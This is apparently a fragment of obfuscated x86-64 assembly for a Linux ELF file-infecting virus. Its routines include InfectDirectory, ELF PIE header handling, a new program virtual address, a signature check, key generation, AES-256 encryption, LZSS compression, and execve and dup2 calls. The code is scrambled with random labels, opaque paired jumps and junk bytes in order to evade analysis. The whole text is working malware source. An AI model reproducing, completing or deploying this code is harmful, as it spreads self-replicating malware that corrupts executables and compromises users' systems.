    jl          ..@rkns6YGsa73B
    jge         ..@rkns6YGsa73B
..@TwWs9gBaEs1w:
    cld
    je          ..@NLikaLsfpMpg
    jne         ..@NLikaLsfpMpg
..@VN29lK5jrfSP:
    add         rsp, _LZSSE_OFF_size
    je          ..@AcurL9t0DFCw
    jne         ..@AcurL9t0DFCw
..@9kC40iy6ZiiS:
    xchg        rbx, rbx
    jmp         $+4
db 0xab, 0x06
    jmp         $+5
db 0xb4, 0x15, 0xe3
    jl          ..@69GXSiwGbrtl
    jge         ..@69GXSiwGbrtl
..@U8A72LDEGHU3:
    mov         ax, WORD [r1]
    jmp         ..@96eUwEyRkEuD
..@G8H8Gw9SD6fW:
    je          ..@7wWwkv0URVQ2
    jmp         $+4
db 0x59, 0x77
    js          ..@YqpdimuTlOGi
    jns         ..@YqpdimuTlOGi
..@1i8sWhnPhcZW:
    ret
    jl          ..@q8d8UkLEKRV3
    jge         ..@q8d8UkLEKRV3
..@aFNiZjtkG5Fb:
    pop         rsi
    jmp         $+3
db 0x51
    jmp         $+3
db 0x2b
    jmp         ..@0XgAlXRSK7r3
..@kAfxVTE86A9l:
    xchg        rdi, rdi
    jb          ..@JiTxFqfu1uF0
    jae         ..@JiTxFqfu1uF0
..@F9Uspe7DxBCc:
    sub         rdi, 1
    jmp         $+3
db 0x9b
    jmp         ..@AswsFdPVxkkI
..@2Pd1Xrb1aMqu:
    VAR         packed, execve3
    jmp         $+5
db 0xe9, 0x36, 0xb5
    jmp         $+4
db 0xd5, 0x34
    js          ..@uLGD1b87C0cz
    jns         ..@uLGD1b87C0cz
..@vTBJD1PXlIM3:
    pop         rbx
    jmp         $+5
db 0xef, 0x79, 0x8d
    js          ..@rhUlCMtnMGlp
    jns         ..@rhUlCMtnMGlp
..@hit5HsXCIgTA:
    push        rax
    jmp         ..@H1stYypOuNOO
..@H4tkZRrWud9B:
    and         eax, edx
    jmp         $+4
db 0xcc, 0x98
    js          ..@B3I3rwNXiyU9
    jns         ..@B3I3rwNXiyU9
..@6LsdJn9MAauS:
    add         r5, rax
    jmp         ..@rUmXhatl8NuZ
..@h3z0KwJ07b53:
    jg          ..@S62Xh7bVPxmn
    jb          ..@qIMGPadWqj2v
    jae         ..@qIMGPadWqj2v
..@3816vnPFkiYI:
    call        WORDToDWORDASCII
    js          ..@BbaiNOFOevFL
    jns         ..@BbaiNOFOevFL
..@6IRY8RrjPAlW:
    test        edx, edx
    jl          ..@c8UZrgj9wOW1
    jge         ..@c8UZrgj9wOW1
..@MKvl8VBbmmnU:
    push        rsi
    jmp         $+3
db 0x4d
    jl          ..@gKcUzy6YWqLH
    jge         ..@gKcUzy6YWqLH
..@68tutwOvTntf:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         $+4
db 0xe5, 0xa8
    jmp         $+4
db 0xe8, 0x10
    js          ..@v3nZDt5AXStJ
    jns         ..@v3nZDt5AXStJ
..@JzTEI2v40mdv:
    xchg        rdx, rdx
    jmp         $+4
db 0xd0, 0xb9
    jl          ..@wiGSBrSiLBr7
    jge         ..@wiGSBrSiLBr7
..@KEBKcmAAB98Z:
    push        rsi
    jmp         $+5
db 0xb5, 0x63, 0xf0
    jl          ..@vO8whxcYFllX
    jge         ..@vO8whxcYFllX
..@GnPBucHgq0Ta:
    xchg        rdx, rdx
    je          ..@eSb6KUDOsbO1
    jne         ..@eSb6KUDOsbO1
..@ExzBoPJxEcLi:
%ifdef X86_32
    push        rbx
%endif
    jmp         $+5
db 0xfe, 0x1b, 0x62
    jmp         $+3
db 0x28
    jmp         $+4
db 0xc1, 0x5e
    jmp         $+3
db 0x89
    jmp         $+3
db 0xbb
    jmp         ..@GxMeCkpMqzKz
..@HH1c1d4b56Xi:
    push        rdi
    jmp         ..@ZluYxhdJK6zO
..@f316IYTgUszI:
    mov         rdx, rdx
    js          ..@IHhP5SZkVYpn
    jns         ..@IHhP5SZkVYpn
..@7IwhTSmwogbs:
    push        rax
    jmp         ..@3gKtpFqU4Zzl
..@mZoofZDjV5av:
    xor         rcx, rcx
    jmp         $+3
db 0x70
    jb          ..@vvyrvD1IZIDl
    jae         ..@vvyrvD1IZIDl
..@Zblf2tZchjwe:
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    jmp         ..@Mnhq8dccixH8
..@GkPnjPOYEwiL:
    add         r4, 1
    jmp         $+5
db 0x52, 0x53, 0x2f
    jmp         ..@4Q7YOax0re2b
..@y41R159tczyK:
    xchg        rax, rax
    jl          ..@wkEvSkHd18dV
    jge         ..@wkEvSkHd18dV
..@DgoRFzE2Ey8B:
    jl          ..@ROkBsdF9L701
    jl          ..@HWz2TjKd2ueE
    jge         ..@HWz2TjKd2ueE
..@sHCqmJMJVMEF:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    jmp         $+4
db 0x8f, 0x1e
    jmp         ..@MakbhbS6rbRf
..@ua5QTjVb1BG8:
    push        r3
    jb          ..@JoUil50Ebyxq
    jae         ..@JoUil50Ebyxq
..@AKQagrU50Auz:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    jmp         $+5
db 0xab, 0x7f, 0xdc
    jmp         $+3
db 0x0a
    jmp         $+3
db 0xeb
    jl          ..@46CI7zwaW6Es
    jge         ..@46CI7zwaW6Es
..@K7njeDmluiIi:
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    js          ..@apUm8aZ1rjZU
    jns         ..@apUm8aZ1rjZU
..@Oo7w6LLLsMKw:
    mov         rbp, rbp
    jmp         $+4
db 0x20, 0x13
    jb          ..@7T9cnKhVR5yS
    jae         ..@7T9cnKhVR5yS
..@LSeS5Kg6t3Bq:
    mov         DWORD [rsp+_KEYGEN_OFF.fd], eax
    jmp         $+3
db 0x08
    jmp         ..@XC8rrRJXvVdr
..@C6AxBntWAL99:
%ifdef X86_32
    xchg        rdx, rdx
%endif
    jb          ..@ExzBoPJxEcLi
    jae         ..@ExzBoPJxEcLi
InfectDirectory:
    jmp         ..@iA6b8dBEg2MO
..@qtxdBnPrTYRD:
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+3
db 0xf1
    jmp         ..@9kC40iy6ZiiS
..@2HQ8H56P4Hkw:
    pop         rax
    jmp         ..@qi3Bz6l39lzy
..@ZYjEYZqE3Ec9:
%ifdef X86_64
    mov         rax, rax
%endif
    jmp         $+3
db 0xe0
    jb          ..@C1i7uRYNRtzg
    jae         ..@C1i7uRYNRtzg
..@UVnKFydXjRfU:
    xor         rax, rax
    jmp         $+4
db 0x1a, 0x6a
    jmp         $+4
db 0xa4, 0xa7
    jl          ..@psGvXBxR3pFx
    jge         ..@psGvXBxR3pFx
..@Ypxn5ibJqqP4:
    push        rdi
    jmp         $+5
db 0xac, 0xfe, 0xef
    je          ..@kYWxcAS8yHle
    jne         ..@kYWxcAS8yHle
..@NLikaLsfpMpg:
    jmp         ..@ADxRDt9H3gdC
    jl          ..@h69jBOvcIRSR
    jge         ..@h69jBOvcIRSR
..@Y3So29mZJF0o:
    sub         r1, r4
    jmp         ..@ggkuQMOmOKm9
..@MNaEjV3sm5ff:
    mov         r5, [rsp+_NBF_OFF.file]
    jl          ..@LcRAF2F5dbR0
    jge         ..@LcRAF2F5dbR0
..@VMarzndVMBB3:
    ret
    jl          ..@oVIGsxIh9dkP
    jge         ..@oVIGsxIh9dkP
..@L4EbWf3cH2wj:
    pop         rdx
    js          ..@3CZO96KSWsZF
    jns         ..@3CZO96KSWsZF
..@Zuf6DsqGJyDc:
    rep         stosb
    jmp         $+5
db 0x0c, 0x30, 0xda
    jmp         $+4
db 0x54, 0xec
    jl          ..@4tiiNd1Pi1tr
    jge         ..@4tiiNd1Pi1tr
..@AEm1z4TxYvs3:
    push        rbx
    jmp         $+5
db 0x34, 0x80, 0x2b
    js          ..@2PeVisk88uDu
    jns         ..@2PeVisk88uDu
..@VDYTx9MrscJ3:
    mov         rcx, rcx
    jmp         ..@TkjmvYujN7H9
..@ZUJQZEeebrQt:
    pop         rdi
    jmp         $+5
db 0x45, 0x88, 0x12
    jmp         ..@HLOFsYwhIhTK
..@6zrdGlR2scha:
    mov         rdi, rdi
    js          ..@CKSWPJMlS0EJ
    jns         ..@CKSWPJMlS0EJ
..@SvOaOeKFCW0d:
    xchg        rsp, rsp
    je          ..@KwhUOdJnNZ0c
    jne         ..@KwhUOdJnNZ0c
..@Ame4Ls2dfw1i:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         $+4
db 0xcb, 0x2d
    jmp         $+5
db 0xdf, 0x6a, 0x33
    jmp         $+3
db 0x55
    jmp         $+3
db 0xa6
    js          ..@u3xHJUTKlxat
    jns         ..@u3xHJUTKlxat
..@qcOT3dWBjptj:
    mov         rax, rax
    jb          ..@zKMSL6hN7rAc
    jae         ..@zKMSL6hN7rAc
..@FFm6yZSYi9pI:
    and         rax, DF_1_PIE
    jb          ..@kAQlSU4vmJlP
    jae         ..@kAQlSU4vmJlP
..@4FIVBMQ4t7E7:
    xchg        rcx, rcx
    jmp         $+5
db 0x25, 0xee, 0x20
    jmp         ..@qFFxgp0k3GEE
..@JoUil50Ebyxq:
    call        GetNewProgramVaddr
    jmp         ..@N22Us3IkdNA7
..@5x3pDcHbPfsf:
    push        rbx
    jl          ..@Y2vlfs8wYIBp
    jge         ..@Y2vlfs8wYIBp
..@vK4UcQMZedHh:
    mov         rcx, rcx
    jmp         $+3
db 0xbb
    jmp         ..@eaZbn2X9C5QN
..@q78QIdNA89NR:
    sub         rsp, _NBF_OFF_size
    jmp         $+4
db 0x42, 0x4c
    js          ..@i2lKI0j97rXO
    jns         ..@i2lKI0j97rXO
..@i9hZflmNJ6Of:
    xchg        rdx, rdx
    je          ..@XqOLHvY4dOLX
    jne         ..@XqOLHvY4dOLX
..@ddENvCMJXQjp:
    call        MemMove
    jmp         $+5
db 0x2a, 0x61, 0x3d
    jl          ..@JXIdZY8XgkdG
    jge         ..@JXIdZY8XgkdG
..@gP26orlXwIsv:
    mov         rbp, rbp
    jmp         $+5
db 0x94, 0x15, 0x3d
    jmp         $+5
db 0x7b, 0xd6, 0xc6
    jmp         $+5
db 0x86, 0xb8, 0x57
    jmp         ..@89Zol8BkMVqB
..@Fe8iy8dhtSDH:
    pop         r2
    jmp         $+4
db 0xe0, 0xb0
    jmp         ..@sbjwJ7qGHCF0
..@zdap21efZ3z4:
    pop         rdx
    jmp         ..@dPseUWWiO6dp
..@Bg9HwdZHm8uC:
    xor         rax, rax
    jmp         $+3
db 0xe0
    jmp         ..@2q7Ze9GnnQ5h
..@9cWkyNcqgq3h:
    mov         rbp, rbp
    jmp         $+4
db 0xd8, 0x5b
    jmp         ..@R9nb7PYJPWSP
..@UEE5Xu1u2hZy:
    mov         rsi, rdi
    jmp         $+5
db 0xb0, 0x32, 0x50
    js          ..@wfSal92SRQF1
    jns         ..@wfSal92SRQF1
..@MAKHRHpNUaPj:
    add         rsp, _INFFILE_OFF_size
    jmp         $+3
db 0x46
    je          ..@oeGjkav4kDJA
    jne         ..@oeGjkav4kDJA
..@oPnNDFdbeFr1:
    add         r2, 1
    jl          ..@0On4fVOqOIbb
    jge         ..@0On4fVOqOIbb
..@TuWZ3r0bVC3k:
    mov         WORD [rsp+_NBF_OFF.index], r2w
    jmp         $+3
db 0xe6
    js          ..@etk0RKy7KiSc
    jns         ..@etk0RKy7KiSc
..@cJ26ftzPQbRK:
    mov         rbp, rbp
    jmp         $+5
db 0x9d, 0xf1, 0x99
    jmp         $+3
db 0xad
    je          ..@TEMMVKly6tqL
    jne         ..@TEMMVKly6tqL
..@aG7y4yMRRI6E:
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    js          ..@aAYRv65qalHL
    jns         ..@aAYRv65qalHL
..@S6WDNFH0p2ag:
    pop         rbx
    js          ..@cJXMT0MdXLZE
    jns         ..@cJXMT0MdXLZE
..@FtF69Lp0i37G:
    mov         rbx, rbx
    jb          ..@5DRh27zFJYQq
    jae         ..@5DRh27zFJYQq
..@5pwYGXC11cBj:
    mov         DWORD [rdi], eax
    jmp         $+4
db 0x38, 0x8e
    jl          ..@l7kX0ITApS4Y
    jge         ..@l7kX0ITApS4Y
..@B2Fz4Y5y3o1L:
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    js          ..@1FrAd4VgjCwb
    jns         ..@1FrAd4VgjCwb
..@2QwpMa40wgqU:
    push        rsi
    jmp         $+5
db 0x42, 0x08, 0x08
    jmp         ..@XzK0xkuGbZhA
..@uqVudlaK2j6s:
    pop         rsi
    jmp         ..@fu9d8PSXOiIx
..@GxMeCkpMqzKz:
%ifdef X86_32
    pop         rbx
%endif
    jmp         ..@mBUuWb4kZ1tL
..@wm3sJ5XAv2Hd:
    push        rdx
    jb          ..@4bMPdROAUjIZ
    jae         ..@4bMPdROAUjIZ
..@dIYrmJZDGS4B:
    xchg        rbx, rbx
    jmp         $+5
db 0x45, 0x8a, 0x3e
    jmp         ..@4hCYrdhx5mEi
..@ZBYE1bHwFXsk:
%ifdef X86_32
    xchg        rdi, rdi
%endif
    jmp         $+5
db 0x7b, 0x3c, 0xa3
    jmp         $+5
db 0x26, 0x42, 0x4a
    jmp         $+3
db 0xa3
    jmp         ..@RShH2Ni3noVY
..@3iqIcUC78QvW:
    pop         rax
    jb          ..@JdQnjgnwKjWj
    jae         ..@JdQnjgnwKjWj
..@ciZcXMoF0SMl:
    call        KeyGen
    jmp         ..@9PA2vtrV8xNl
..@XXQKY0d5eoEl:
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         ..@3p18oUkRLE2Z
..@s1XN53uW093l:
    mov         rbx, rbx
    jmp         ..@sMMymuIAKF1z
..@TQoqFgT88wff:
    pop         rdx
    jmp         $+4
db 0x32, 0xe1
    jmp         ..@OV9LEmzTzSmb
..@OaVpWDuvUQyK:
    xchg        rdi, rdi
    jl          ..@rTCE6cME5Hy9
    jge         ..@rTCE6cME5Hy9
..@5oGOm8D6UFPm:
    add         r1, signature_len-1
    jmp         ..@pwTH18z844Ms
..@aJYtY0zj8vdS:
    xchg        rsp, rsp
    jmp         $+3
db 0x65
    jmp         ..@gppamhlvpXeI
..@LFsJfpKCwAJz:
    pop         rdx
    jmp         ..@zjxUMpRiw16C
..@otCsBPGjgLii:
    xchg        rdx, rdx
    jb          ..@J29kLGxvQTKJ
    jae         ..@J29kLGxvQTKJ
..@1e6e3S9rnZpz:
    aesenc      xmm0, xmm1
    jb          ..@zArXDGkyTI5j
    jae         ..@zArXDGkyTI5j
..@rFX37u9qjjQJ:
    jnz         ..@L6LizbSahhQZ
    js          ..@tRjz8tUhwNIc
    jns         ..@tRjz8tUhwNIc
..@mxG4kBZe2neY:
    mov         rcx, rcx
    jmp         $+5
db 0x46, 0x8a, 0x86
    je          ..@7y8cbXb5Nazr
    jne         ..@7y8cbXb5Nazr
..@Kj9iDOvqyJrc:
    push        rbx
    jmp         ..@XHA2fHU00egB
..@78XXyJUUHAaB:
    mov         rax, r2
    jmp         $+4
db 0x73, 0x5e
    jl          ..@g146mVgvuavu
    jge         ..@g146mVgvuavu
..@IC0SnD98w1TZ:
    push        rax
    jmp         $+4
db 0x2a, 0x00
    jmp         $+5
db 0xcb, 0x5b, 0xb2
    je          ..@eJdzzwcfOUHC
    jne         ..@eJdzzwcfOUHC
..@zpUmInMSCIWk:
    sub         rcx, m6
    jmp         $+4
db 0x38, 0x91
    jmp         ..@WGwBxL3u4i2O
..@AyonmhGxCOzf:
    add         r4, 1
    js          ..@YOWlxo9zjrzz
    jns         ..@YOWlxo9zjrzz
..@oONzZfyftDT8:
    push        rbx
    jmp         $+3
db 0x70
    jmp         $+3
db 0x1f
    jmp         $+4
db 0xa9, 0x23
    jl          ..@ayI9g5LBwTEB
    jge         ..@ayI9g5LBwTEB
..@PSwaKYpl0Yv1:
    mov         eax, SYS_DUP2
    jmp         ..@9fZqRVWSlbtL
..@kELIWW7luj3y:
    add         eax, 0x57
    jl          ..@yxOkqU9aiUtE
    jge         ..@yxOkqU9aiUtE
..@P2YWDIwt1LjV:
    sub         rsp, _KEYGEN_OFF_size
    jmp         $+3
db 0x57
    jmp         ..@pdZFNlcQxkEC
..@qNSxBQNuZ2RF:
    movdqu      xmm1, oWORD [rsp+0xb0]
    jb          ..@nDa6Hwkpl882
    jae         ..@nDa6Hwkpl882
..@pXVVgeDjtIvV:
    cmp         BYTE [r1], DT_DIR
    js          ..@6IlraetsIE21
    jns         ..@6IlraetsIE21
..@jRiZPA9lLlNZ:
    mov         r1, 0x00
    jmp         $+4
db 0x69, 0xd1
    jmp         $+5
db 0x5e, 0x5f, 0xed
    jb          ..@IKHjgoIyuBlm
    jae         ..@IKHjgoIyuBlm
..@zhL7ykK8IjGg:
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    jmp         ..@rH4dcEHBK4vr
..@kak2jcwKq1BK:
    mov         BYTE [r1], 0x00
    jmp         $+5
db 0xc1, 0x2c, 0x96
    js          ..@QIkvFuBdaMAO
    jns         ..@QIkvFuBdaMAO
..@18XCsPH2mKwQ:
    mov         rdi, rdi
    jmp         $+4
db 0xbc, 0x77
    jmp         ..@HPbXx9fj5wji
..@XlBMhvZCNyoO:
    push        rsi
    jmp         $+4
db 0x62, 0x5d
    jmp         ..@QuipTfK0QVM7
..@cYPKUbSo14fu:
    call        Strcpy
    jmp         $+3
db 0x77
    jb          ..@EsbxTwnUdAAv
    jae         ..@EsbxTwnUdAAv
..@pQA3FxRP3BpM:
    test        r2, r2
    jmp         $+5
db 0xc9, 0xae, 0x62
    jmp         ..@dMK31tHFoZ1I
..@3oF64TIf6Y8q:
    and         r3, 0xfff 
    jmp         $+5
db 0xf7, 0x3b, 0x96
    jmp         $+4
db 0x0d, 0xce
    jb          ..@2f6WFucsB0UF
    jae         ..@2f6WFucsB0UF
..@pd9RkAWI4gZ4:
    push        rbx
    jmp         $+4
db 0x8a, 0xf2
    jmp         $+4
db 0x60, 0xbc
    jb          ..@8iZX7yZ0MG3y
    jae         ..@8iZX7yZ0MG3y
..@JiTxFqfu1uF0:
    pop         rsi
    jmp         $+3
db 0x80
    js          ..@89HPwtve2abX
    jns         ..@89HPwtve2abX
..@pdKRe82FTbo0:
    jnz         ..@f316IYTgUszI
    jmp         $+3
db 0xd8
    jb          ..@uiwJvslkkDtE
    jae         ..@uiwJvslkkDtE
..@WGwBxL3u4i2O:
    mov         eax, 0x00
    jmp         $+3
db 0xa7
    jmp         ..@Fx1OEH1D6TyO
..@OV9LEmzTzSmb:
    mov         rsp, rsp
    jmp         ..@aWh9C6pdWdTl
..@x2dTYTTyoxV5:
    mov         rsp, rsp
    jmp         $+4
db 0x11, 0x45
    jmp         $+5
db 0xde, 0xb0, 0x9a
    jmp         $+4
db 0x7a, 0x2e
    jmp         $+4
db 0x41, 0x8a
    jmp         $+4
db 0xf3, 0xa2
    jmp         ..@ZANlewTeEjt1
..@RVt98gdrTG8A:
    pop         rsi
    jmp         $+4
db 0x0b, 0xb2
    jb          ..@tGEUPkxab9Mk
    jae         ..@tGEUPkxab9Mk
..@WfsCIBhmiCS2:
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    jmp         $+5
db 0x71, 0x8f, 0x72
    jb          ..@m31NW4ukKKcX
    jae         ..@m31NW4ukKKcX
..@LE94SB45EOao:
    jl          ..@3ewpnq0acImD
    je          ..@bT1xPz9oENTq
    jne         ..@bT1xPz9oENTq
..@1AVp6vuNRqeC:
    pop         rdx
    jmp         ..@sSrJ8mM6NK2j
..@77M8PLdZvAHr:
    VAR         packed, execve1
    jl          ..@VriBhlq6vdf2
    jge         ..@VriBhlq6vdf2
..@uEbpNtmKcjpw:
    xchg        rsp, rsp
    jmp         ..@yXakaUAUhlH4
..@Tks4ZcCDoqxY:
    push        rdx
    jmp         $+3
db 0x0c
    jmp         $+5
db 0x2c, 0x17, 0x22
    jl          ..@nZ8KZUC16k9C
    jge         ..@nZ8KZUC16k9C
..@PGALqiWbc8jY:
%ifdef X86_32
    xchg        rbx, rbx
%endif
    jl          ..@sHCqmJMJVMEF
    jge         ..@sHCqmJMJVMEF
..@awsAzJ0mn4Rz:
    xchg        rcx, rcx
    jmp         $+5
db 0x4d, 0x64, 0x6d
    jb          ..@NSbGzyCZ9BmQ
    jae         ..@NSbGzyCZ9BmQ
..@sbjwJ7qGHCF0:
    pop         r1
    jmp         $+3
db 0x60
    jl          ..@W0360JvDv2tt
    jge         ..@W0360JvDv2tt
..@0PJdZTYW57J7:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+3
db 0x9c
    js          ..@8xmizjmc9cEd
    jns         ..@8xmizjmc9cEd
..@9x4EqLGXEpJd:
    mov         r1, QWORD [r5+file.fileptr]
    js          ..@5oGOm8D6UFPm
    jns         ..@5oGOm8D6UFPm
..@1EIL50afa1F2:
    mov         rcx, rcx
    jmp         $+3
db 0xef
    jmp         $+5
db 0x53, 0x75, 0x74
    je          ..@CqzD0QAF8aKu
    jne         ..@CqzD0QAF8aKu
..@TDXwXJKOxNbi:
    call        MemMove
    jmp         $+3
db 0x6f
    jb          ..@hwpGTTVUBtAT
    jae         ..@hwpGTTVUBtAT
..@7hI8BSPjhnDN:
    jg          ..@R8nSqv1ZK9gw
    jmp         $+4
db 0x61, 0x50
    jmp         $+4
db 0xef, 0xa7
    jb          ..@cGGF9LgRRfC6
    jae         ..@cGGF9LgRRfC6
..@Ew4InucbLsaU:
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    jl          ..@XXFTV54Ku5ZI
    jge         ..@XXFTV54Ku5ZI
..@jsADnLKXdzL5:
    mov         QWORD [r2+p_h.p_vaddr], r3
    jmp         ..@ds7edPevaDKE
..@ob2uLfXsnMyM:
    mov         rcx, rcx
    jmp         $+4
db 0x59, 0x21
    je          ..@VbaSRLuwyXTI
    jne         ..@VbaSRLuwyXTI
..@RIUmEg8pdeRt:
    xchg        rbx, rbx
    jl          ..@LhQ8RW44NVdc
    jge         ..@LhQ8RW44NVdc
..@HiAHGyFo3ga2:
    xchg        rdx, rdx
    jmp         ..@5x3pDcHbPfsf
..@3aU9Sh4lEmAy:
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    jl          ..@6LsdJn9MAauS
    jge         ..@6LsdJn9MAauS
..@mFec5JrDp3Gd:
    pop         rax
    jb          ..@WuSftzfXCVe4
    jae         ..@WuSftzfXCVe4
..@nEGVxD9XNTD7:
    xor         rdx, rdx
    jmp         $+4
db 0x62, 0xda
    js          ..@ZyfMGV51jLWg
    jns         ..@ZyfMGV51jLWg
..@3kVbBCEbOYWo:
    xchg        rdi, rdi
    jmp         $+3
db 0xff
    jmp         $+5
db 0xc0, 0x37, 0x88
    jb          ..@A2ObgkaPaV0X
    jae         ..@A2ObgkaPaV0X
..@F4WHe5ndtSkp:
    mov         [r1], rax
    js          ..@FY4hrDPx004g
    jns         ..@FY4hrDPx004g
..@1gLlsEw9DTKD:
    rep         nop
    jmp         $+3
db 0xdc
    jl          ..@XjikLJuE8JPD
    jge         ..@XjikLJuE8JPD
..@J4fHDj233N1p:
    movdqu      xmm1, oWORD [rsp+0x70]
    jb          ..@HJyZWzY4kyVg
    jae         ..@HJyZWzY4kyVg
..@y2DqRQRSx2zJ:
%ifdef X86_32
    mov         rdi, rdi
%endif
    jmp         ..@ZZ9we93SO1RQ
..@e3OElBBIQoje:
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    jmp         $+4
db 0x57, 0xb7
    jmp         $+4
db 0xea, 0x4b
    jb          ..@VN29lK5jrfSP
    jae         ..@VN29lK5jrfSP
..@lD7TpfoCMIk9:
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    je          ..@dUoZjXQUkXyY
    jne         ..@dUoZjXQUkXyY
..@AN5uewUDIYYA:
    pop         rcx
    jmp         ..@myG2fqSFlYsn
..@dILj5dvR25pm:
    push        rbx
    jmp         ..@O9oA3H0FY5gd
..@dIOd4c0vrFqV:
    mov         r3, rax
    jmp         ..@3oF64TIf6Y8q
..@dzP0V3t9FZMT:
    xchg        rsi, rsi
    js          ..@vTBJD1PXlIM3
    jns         ..@vTBJD1PXlIM3
..@wAzxDcM4oCqk:
    push        rsi
    jmp         $+4
db 0x4a, 0x88
    jmp         $+4
db 0x78, 0x30
    js          ..@EozJVTrqDDpj
    jns         ..@EozJVTrqDDpj
..@Tzssvcf1WATA:
    pop         rbx
    jb          ..@5R5JfhCgZ2de
    jae         ..@5R5JfhCgZ2de
..@cbicvyoEzWq5:
    ret
    je          Aes256Encryption
    jne         Aes256Encryption
..@iTOQ80ObvvjS:
%ifdef X86_64
    mov         rcx, rcx
%endif
    jmp         ..@T1LeFHZ3sxEf
..@oz49tbClRvoW:
    or          edi, eax
    jl          ..@atWELHgHAhvW
    jge         ..@atWELHgHAhvW
..@6Lg9ncNrtffL:
    push        rbx
    jmp         ..@lG2do00ppE3p
..@90jXqwTJKaZZ:
    lea         r1, [rsp+_PROC_OFF.buffer]
    jmp         $+3
db 0x51
    jmp         $+4
db 0x2e, 0x91
    js          ..@eOaIIwRfSb6g
    jns         ..@eOaIIwRfSb6g
..@vzpjBsv2rGJ0:
    mov         r2, m6
    js          ..@puNfLQpYsa6b
    jns         ..@puNfLQpYsa6b
..@75tHen8X7B2j:
    pop         rsi
    je          ..@bMGFzYwb8TDt
    jne         ..@bMGFzYwb8TDt
..@3yN85hFEe0ub:
    pop         rcx
    jmp         ..@hgDoGSPPBir0
..@B9ICdJt2wKMl:
    mov         rsi, rsi
    jmp         $+4
db 0x3a, 0x88
    jmp         $+4
db 0xee, 0x28
    js          ..@u1EYEmHdZpps
    jns         ..@u1EYEmHdZpps
..@S1ioZuUrgK56:
    add         rcx, 0x10
    jb          ..@eZDPmbidE1UG
    jae         ..@eZDPmbidE1UG
..@YwW9FqVy3Aih:
    mov         r3, _signature.startsize
    jmp         ..@pXO4G5PVmTVb
..@hc3de2wEZ48B:
%ifdef X86_32
    mov         esi, 0x01
%endif
    je          ..@D9bcB22pXiSv
    jne         ..@D9bcB22pXiSv
..@01KmPh1pMrg4:
    mov         rbx, rbx
    je          ..@RRLbYBbHnkVv
    jne         ..@RRLbYBbHnkVv
..@HzXB26RWCbdC:
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    jmp         ..@voOB5tCFzphu
..@qXaOqOcfr05P:
    mov         rsi, rsi
    jmp         $+3
db 0xb7
    jl          ..@N2BW9RcO0MNZ
    jge         ..@N2BW9RcO0MNZ
..@CqzD0QAF8aKu:
    xchg        rdx, rdx
    jmp         $+5
db 0x0f, 0x1d, 0xb2
    jmp         ..@1AX76Hw7VESY
..@voOB5tCFzphu:
    add         r1, 2
    jmp         $+3
db 0x33
    jmp         $+5
db 0xbf, 0xa0, 0x4c
    jmp         $+4
db 0x8d, 0x86
    jmp         $+5
db 0x8e, 0x78, 0xe6
    jl          ..@1gLlsEw9DTKD
    jge         ..@1gLlsEw9DTKD
..@pdZFNlcQxkEC:
    mov         QWORD [rsp+_KEYGEN_OFF.bufferaddr], r1
    jb          ..@I3nHUbGrdmNp
    jae         ..@I3nHUbGrdmNp
..@qVaElCqUnUvs:
    rep         nop
    jmp         $+4
db 0xde, 0x7c
    jmp         ..@DAIB3p4wmlJq
..@zk8jyh8E5g7C:
    pop         rsi
    jmp         $+3
db 0xfd
    jmp         ..@ay9TVgXCnb4W
..@9pFq20ggMjwY:
    push        rcx
    jmp         ..@eWM8fDR50R6p
..@AqlBYlvjxPfE:
    mov         rdx, rdx
    jmp         $+3
db 0x3e
    je          ..@KeMn2RMhxsAg
    jne         ..@KeMn2RMhxsAg
..@0r93oJdviklF:
    pop         rdx
    jmp         $+4
db 0x5c, 0xf9
    js          ..@YAR2UJEXOp2W
    jns         ..@YAR2UJEXOp2W
..@8zJfLqItItqz:
    pop         rbx
    jmp         $+3
db 0x2d
    jmp         ..@2TZ7jo98KTwR
..@pNbWx2TWp9AA:
    add         r2, rax
    je          ..@dlPFOLJXTFet
    jne         ..@dlPFOLJXTFet
..@RCwUNDzm7gck:
    OFILE       [r1], 0x10000
    jmp         $+3
db 0x71
    jb          ..@mINklGBCR7em
    jae         ..@mINklGBCR7em
..@0bvBnVyQ36mX:
    mov         rcx, rcx
    jmp         ..@elqLqqTrS90H
..@ONjgPfVYWQR4:
    add         r1, QWORD [r2]
    jmp         $+5
db 0x50, 0xed, 0x7b
    js          ..@5UaStCm29ERn
    jns         ..@5UaStCm29ERn
..@zVUvV7ZbTLGG:
    push        rsi
    jmp         ..@QGA4oQMp8Fco
..@WbGFnBTVooiA:
    xchg        rcx, rcx
    jmp         $+4
db 0xce, 0xac
    jmp         ..@hSr1Ow89MLTZ
..@98nlV5woH3OZ:
    pop         rbx
    jmp         $+4
db 0x2b, 0x86
    jmp         $+5
db 0x97, 0xcc, 0x74
    jmp         ..@aJYtY0zj8vdS
..@4xxvy8lTJrIA:
    mov         r3d, 0x20
    jl          ..@JbhC7J3XmP1G
    jge         ..@JbhC7J3XmP1G
WORDToDWORDASCII:
    jmp         ..@kCYTPWF962gz
..@ZZ9we93SO1RQ:
%ifdef X86_32
    xchg        rdi, rdi
%endif
    jmp         ..@gUidQ96OBJDa
..@PWATGJdVqW0Y:
    mov         rdx, rdx
    js          ..@90jXqwTJKaZZ
    jns         ..@90jXqwTJKaZZ
..@KJqaMq2DCq4f:
    and         r2, 0xfffffffffffffff0
    jmp         ..@FWmo02vl2tsS
..@B0LKVqKbCI5F:
    mov         rdi, rdi
    jmp         $+3
db 0xd7
    jmp         $+4
db 0x80, 0xda
    jmp         ..@6X0IhaTVuM0H
